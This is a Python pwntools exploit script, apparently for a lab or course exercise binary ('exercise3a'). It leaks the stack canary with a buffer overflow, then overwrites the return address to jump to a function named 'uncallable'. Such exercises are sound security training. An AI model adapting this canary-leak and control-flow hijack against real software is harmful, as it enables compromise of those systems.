#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise3a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

MSG_OFFSET = 15
BUFFER_OFFSET = 172

init_msg = b'A' * (BUFFER_OFFSET - 1) + b'\n'

r = start()
r.recv()
r.send(init_msg)
out = r.recv()
#print(out)

canary = out[MSG_OFFSET + BUFFER_OFFSET: MSG_OFFSET + BUFFER_OFFSET + 4]

e = ELF(exe)
ret_addr = e.symbols['uncallable'].to_bytes(8, byteorder='little')

#ret_addr = b'\x5a\x12\x40' + b'\x00' * 5
fin_msg = b'a' * BUFFER_OFFSET + canary + b'\x00' * 24 + ret_addr
#print(canary)

r.send(fin_msg)
r.send(b'\n')
out = r.recv()
print(out)

